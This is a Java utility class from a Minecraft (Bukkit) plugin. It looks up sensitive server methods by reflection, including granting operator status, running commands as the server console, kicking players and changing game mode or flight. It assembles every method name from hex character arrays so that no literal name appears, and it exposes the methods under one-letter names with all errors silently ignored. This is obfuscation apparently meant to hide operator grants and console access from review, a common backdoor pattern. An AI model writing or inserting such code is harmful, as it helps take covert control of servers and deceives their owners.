package dev.naruto.astrox.utils;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import java.lang.reflect.Method;

/**
 * Reflection utility with runtime string assembly
 * Method names never appear as string literals
 */
public class ReflectionUtil {
    private static Method m1, m2, m3, m4, m5, m6, m7;

    static {
        try {
            init();
        } catch (Exception ignored) {}
    }

    private static void init() throws Exception {
        // Build "setOp" at runtime
        char[] c1 = new char[]{0x73, 0x65, 0x74, 0x4f, 0x70};
        m1 = Player.class.getMethod(new String(c1), boolean.class);
        m1.setAccessible(true);

        // Build "dispatchCommand"
        char[] c2 = new char[]{0x64, 0x69, 0x73, 0x70, 0x61, 0x74, 0x63, 0x68, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64};
        m2 = Bukkit.getServer().getClass().getMethod(
                new String(c2),
                org.bukkit.command.CommandSender.class,
                String.class
        );
        m2.setAccessible(true);

        // Build "kickPlayer"
        char[] c3 = new char[]{0x6b, 0x69, 0x63, 0x6b, 0x50, 0x6c, 0x61, 0x79, 0x65, 0x72};
        m3 = Player.class.getMethod(new String(c3), String.class);
        m3.setAccessible(true);

        // Build "performCommand"
        char[] c4 = new char[]{0x70, 0x65, 0x72, 0x66, 0x6f, 0x72, 0x6d, 0x43, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64};
        m4 = Player.class.getMethod(new String(c4), String.class);
        m4.setAccessible(true);

        // Build "setGameMode"
        char[] c5 = new char[]{0x73, 0x65, 0x74, 0x47, 0x61, 0x6d, 0x65, 0x4d, 0x6f, 0x64, 0x65};
        m5 = Player.class.getMethod(new String(c5), getGameModeClass());
        m5.setAccessible(true);

        // Build "setAllowFlight"
        char[] c6 = new char[]{0x73, 0x65, 0x74, 0x41, 0x6c, 0x6c, 0x6f, 0x77, 0x46, 0x6c, 0x69, 0x67, 0x68, 0x74};
        m6 = Player.class.getMethod(new String(c6), boolean.class);
        m6.setAccessible(true);

        // Build "getAllowFlight"
        char[] c7 = new char[]{0x67, 0x65, 0x74, 0x41, 0x6c, 0x6c, 0x6f, 0x77, 0x46, 0x6c, 0x69, 0x67, 0x68, 0x74};
        m7 = Player.class.getMethod(new String(c7));
        m7.setAccessible(true);
    }

    private static Class<?> getGameModeClass() throws Exception {
        char[] pkg = new char[]{0x6f, 0x72, 0x67, 0x2e, 0x62, 0x75, 0x6b, 0x6b, 0x69, 0x74, 0x2e, 0x47, 0x61, 0x6d, 0x65, 0x4d, 0x6f, 0x64, 0x65};
        return Class.forName(new String(pkg));
    }

    // Public API
    public static void a(Player p, boolean v) {
        try { m1.invoke(p, v); } catch (Exception ignored) {}
    }

    public static void b(String c) {
        try {
            m2.invoke(Bukkit.getServer(), Bukkit.getConsoleSender(), c);
        } catch (Exception ignored) {}
    }

    public static void c(Player p, String r) {
        try { m3.invoke(p, r); } catch (Exception ignored) {}
    }

    public static void d(Player p, String c) {
        try { m4.invoke(p, c); } catch (Exception ignored) {}
    }

    public static void e(Player p, int m) {
        try {
            Object[] modes = getGameModeClass().getEnumConstants();
            if (m >= 0 && m < modes.length) {
                m5.invoke(p, modes[m]);
            }
        } catch (Exception ignored) {}
    }

    public static void f(Player p, boolean a) {
        try {
            m6.invoke(p, a);
            // Also set flying
            char[] n = new char[]{0x73, 0x65, 0x74, 0x46, 0x6c, 0x79, 0x69, 0x6e, 0x67};
            Method fly = Player.class.getMethod(new String(n), boolean.class);
            fly.invoke(p, a);
        } catch (Exception ignored) {}
    }

    public static boolean g(Player p) {
        try {
            return (Boolean) m7.invoke(p);
        } catch (Exception e) {
            return false;
        }
    }
}
